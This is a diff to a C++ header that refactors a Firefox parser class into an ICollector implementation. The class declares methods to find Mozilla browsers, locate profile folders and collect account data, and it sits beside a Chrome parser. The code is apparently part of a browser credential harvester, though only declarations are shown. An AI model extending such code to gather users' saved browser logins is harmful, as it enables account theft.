@@ -1,21 +1,19 @@
 ﻿#pragma once
 #include "ChromeParser.h"
 #include "Forwards.h"
+#include "ICollector.h"
 
 
-
-class FirefoxParser
+class firefox_parser : public ICollector
 {
 public:
-	FirefoxParser();
-	~FirefoxParser() = default;
+	firefox_parser();
+	~firefox_parser() = default;
 public:
-	
-	List<AccountData> collect_data();
 
-private:
+	List<AccountData> collect_data() override;
 
-	
+private:	
 	
 	List<String> get_mozilla_browsers();
 	String get_profile_dir(const String& dir_localdata);	
